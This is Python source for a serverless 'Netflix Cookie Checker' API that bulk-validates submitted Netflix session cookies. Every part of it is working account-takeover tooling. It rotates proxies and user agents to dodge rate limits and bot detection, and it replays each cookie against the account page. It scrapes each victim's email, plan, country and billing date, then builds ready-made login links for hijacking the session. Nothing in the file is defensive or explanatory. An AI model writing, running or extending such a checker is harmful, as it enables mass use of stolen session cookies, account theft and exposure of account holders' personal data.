"""
Netflix Cookie Checker API
Python 3.12+  •  Vercel Serverless Function
POST /api/check  →  { results: [...] }
GET  /api/check  →  { status: "ok", proxies: N }
"""
from __future__ import annotations

import base64
import json
import os
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler
from typing import Any
from urllib.parse import parse_qs

import requests


# ── proxy loader ────────────────────────────────────────────────────────────
def _load_proxies() -> list[dict[str, str]]:
    """
    PROXY_LIST env var: comma-separated entries, each one of:
      ip:port
      user:pass@ip:port
    """
    raw = os.environ.get("PROXY_LIST", "").strip()
    if not raw:
        return []
    result: list[dict[str, str]] = []
    for entry in raw.split(","):
        entry = entry.strip()
        if not entry:
            continue
        if "@" in entry:
            auth, host = entry.split("@", 1)
            url = f"http://{auth}@{host}"
        else:
            url = f"http://{entry}"
        result.append({"http": url, "https": url})
    return result


_PROXY_POOL: list[dict[str, str]] = _load_proxies()


def _pick_proxy() -> dict[str, str] | None:
    return random.choice(_PROXY_POOL) if _PROXY_POOL else None


# ── user-agent pool ──────────────────────────────────────────────────────────
_UA_POOL = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Safari iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    # Chrome Android
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
]


# ── cookie normalizer ────────────────────────────────────────────────────────
def _normalize_cookie(raw: str) -> str:
    """
    Accept:
      - Netscape tab-delimited format (7 columns)
      - key=value; key=value; ...  (header style)
    Return header-style string.
    """
    raw = raw.strip()
    if "\t" in raw:
        # Netscape format: domain \t flag \t path \t secure \t expiry \t name \t value
        parts = raw.split("\t")
        if len(parts) >= 7:
            name, value = parts[5].strip(), parts[6].strip()
            # Collect all lines that look like this format into one header string
            return f"{name}={value}"
    return raw


def _merge_cookie_lines(lines: list[str]) -> list[str]:
    """
    Group consecutive Netscape-format lines into single cookie header strings.
    Plain header-style lines pass through unchanged.
    """
    netscape: dict[str, str] = {}
    plain: list[str] = []
    header_lines: list[str] = []
    bucket: list[str] = []

    for line in lines:
        line = line.strip()
        if not line or "=" not in line:
            continue
        if "\t" in line:
            bucket.append(line)
        else:
            # flush bucket
            if bucket:
                kv: dict[str, str] = {}
                for b in bucket:
                    p = b.split("\t")
                    if len(p) >= 7:
                        kv[p[5].strip()] = p[6].strip()
                if kv:
                    plain.append("; ".join(f"{k}={v}" for k, v in kv.items()))
                bucket = []
            plain.append(line)

    if bucket:
        kv = {}
        for b in bucket:
            p = b.split("\t")
            if len(p) >= 7:
                kv[p[5].strip()] = p[6].strip()
        if kv:
            plain.append("; ".join(f"{k}={v}" for k, v in kv.items()))

    return plain


# ── detail extractor ─────────────────────────────────────────────────────────
def _extract_details(html: str) -> dict[str, str]:
    details: dict[str, str] = {}

    # Try react context blob first
    ctx_match = re.search(
        r'window\.__reactLoadableManifest\b|window\.__netflix\.reactContext\s*=\s*({.{50,}}?});',
        html, re.DOTALL
    )
    if ctx_match and ctx_match.lastindex:
        try:
            data = json.loads(ctx_match.group(1))
            ui = (
                data.get("models", {}).get("userInfo", {}).get("data", {})
                or data.get("models", {}).get("serverModel", {}).get("data", {}).get("userInfo", {})
            )
            details["email"] = ui.get("email", "")
            details["membership"] = ui.get("membershipStatus", "")
            details["plan"] = (ui.get("plan") or {}).get("planName", "")
            details["country"] = ui.get("countryOfSignup", "")
            details["nextBilling"] = ui.get("nextBillingDate", "")
            details["profiles"] = str(len(data.get("models", {}).get("profiles", {}).get("data", {}).get("profiles", []) or []))
        except Exception:
            pass

    # Regex fallbacks
    if not details.get("email"):
        m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
        details["email"] = m.group(1) if m else ""
    if not details.get("membership"):
        m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
        details["membership"] = m.group(1) if m else ""
    if not details.get("plan"):
        m = re.search(r'"planName"\s*:\s*"([^"]+)"', html)
        details["plan"] = m.group(1) if m else ""
    if not details.get("country"):
        m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html)
        details["country"] = m.group(1) if m else ""

    return {k: v for k, v in details.items() if v}


# ── api token builder ─────────────────────────────────────────────────────────
def _build_api_tokens(cookie: str) -> dict[str, Any]:
    nid = re.search(r'NetflixId=([^;]+)', cookie)
    sid = re.search(r'SecureNetflixId=([^;]+)', cookie)
    if not (nid and sid):
        return {}

    payload = {
        "netflixId": nid.group(1).strip(),
        "secureNetflixId": sid.group(1).strip(),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    token = (
        base64.b64encode(json.dumps(payload).encode())
        .decode()
        .replace("+", "-")
        .replace("/", "_")
        .rstrip("=")
    )
    return {
        "api_token": token,
        "direct_links": {
            "computer": {
                "name": "💻 Computer",
                "url": f"https://www.netflix.com/Login?apiToken={token}",
            },
            "mobile": {
                "name": "📱 Mobile",
                "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=mobile",
            },
            "tv": {
                "name": "📺 TV",
                "url": f"https://www.netflix.com/tv/login?apiToken={token}",
            },
        },
    }


# ── core checker ──────────────────────────────────────────────────────────────
def _check_one(cookie: str, idx: int) -> dict[str, Any]:
    result: dict[str, Any] = {
        "index": idx,
        "status": "unknown",
        "message": "",
        "cookie": cookie,
        "details": {},
        "api_tokens": {},
        "checked_at": datetime.now(timezone.utc).isoformat(),
    }

    ua = random.choice(_UA_POOL)
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Cookie": cookie,
    }

    proxy = _pick_proxy()

    try:
        sess = requests.Session()
        sess.max_redirects = 6

        # Step 1: homepage to warm session
        sess.get(
            "https://www.netflix.com/",
            headers=headers,
            timeout=12,
            allow_redirects=True,
            proxies=proxy,
        )
        time.sleep(random.uniform(0.2, 0.6))

        # Step 2: account page
        r2 = sess.get(
            "https://www.netflix.com/YourAccount",
            headers=headers,
            timeout=18,
            allow_redirects=True,
            proxies=proxy,
        )
        final_url = r2.url.lower()
        text = r2.text

        # ── classify ──────────────────────────────────────────────────────────
        if "login" in final_url or r2.status_code in (401, 403):
            result["status"] = "invalid"
            result["message"] = "Cookie expired or invalid"
            return result

        if r2.status_code == 429:
            result["status"] = "error"
            result["message"] = "Rate limited — try again later"
            return result

        if r2.status_code >= 500:
            result["status"] = "error"
            result["message"] = f"Netflix server error ({r2.status_code})"
            return result

        # Check indicators of valid session
        valid_indicators = [
            "membershipStatus", "profilesGate", "YourAccount",
            "ManageAccount", "profiles", "planName",
        ]
        if any(ind in text for ind in valid_indicators):
            result["status"] = "valid"
            result["message"] = "Active session"
            result["details"] = _extract_details(text)
            result["api_tokens"] = _build_api_tokens(cookie)
        elif "captcha" in text.lower() or "robot" in text.lower():
            result["status"] = "error"
            result["message"] = "Bot detection triggered"
        else:
            result["status"] = "error"
            result["message"] = "Could not verify — unknown response"

    except requests.exceptions.ProxyError:
        result["status"] = "error"
        result["message"] = "Proxy error"
    except requests.exceptions.ConnectTimeout:
        result["status"] = "error"
        result["message"] = "Connection timed out"
    except requests.exceptions.ReadTimeout:
        result["status"] = "error"
        result["message"] = "Read timed out"
    except requests.exceptions.SSLError:
        result["status"] = "error"
        result["message"] = "SSL error"
    except Exception as exc:
        result["status"] = "error"
        result["message"] = str(exc)[:120]

    return result


def _run_check(cookies: list[str], workers: int = 6) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_check_one, c, i): i for i, c in enumerate(cookies, 1)}
        for fut in as_completed(futs):
            try:
                results.append(fut.result())
            except Exception as exc:
                results.append({
                    "index": futs[fut],
                    "status": "error",
                    "message": str(exc)[:120],
                    "cookie": "",
                    "details": {},
                    "api_tokens": {},
                })
    results.sort(key=lambda x: x.get("index", 0))
    return results


# ── Vercel HTTP handler ───────────────────────────────────────────────────────
def _json_response(handler: BaseHTTPRequestHandler, code: int, data: Any) -> None:
    body = json.dumps(data, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Content-Length", str(len(body)))
    handler.send_header("Access-Control-Allow-Origin", "*")
    handler.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
    handler.send_header("Access-Control-Allow-Headers", "Content-Type")
    handler.end_headers()
    handler.wfile.write(body)


class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        _json_response(self, 200, {
            "status": "ok",
            "proxies": len(_PROXY_POOL),
            "workers": 6,
            "version": "2.0.0",
        })

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            if length > 5 * 1024 * 1024:  # 5 MB max
                _json_response(self, 413, {"error": "Payload too large"})
                return

            raw_body = self.rfile.read(length)
            body = json.loads(raw_body.decode("utf-8"))

            raw_cookies: str = body.get("cookies", "")
            if not raw_cookies or not raw_cookies.strip():
                _json_response(self, 400, {"error": "No cookies provided"})
                return

            lines = [l.strip() for l in raw_cookies.splitlines() if l.strip()]
            cookies = _merge_cookie_lines(lines)
            # filter lines that actually look like cookie headers
            cookies = [c for c in cookies if "=" in c and len(c) > 10]

            if not cookies:
                _json_response(self, 400, {"error": "No valid cookie lines found"})
                return

            # Cap at 50 per request to stay within Vercel timeout
            cookies = cookies[:50]

            workers = min(6, len(cookies))
            results = _run_check(cookies, workers=workers)
            _json_response(self, 200, {"results": results})

        except json.JSONDecodeError:
            _json_response(self, 400, {"error": "Invalid JSON body"})
        except Exception as exc:
            _json_response(self, 500, {"error": str(exc)})

    def log_message(self, *_):
        pass
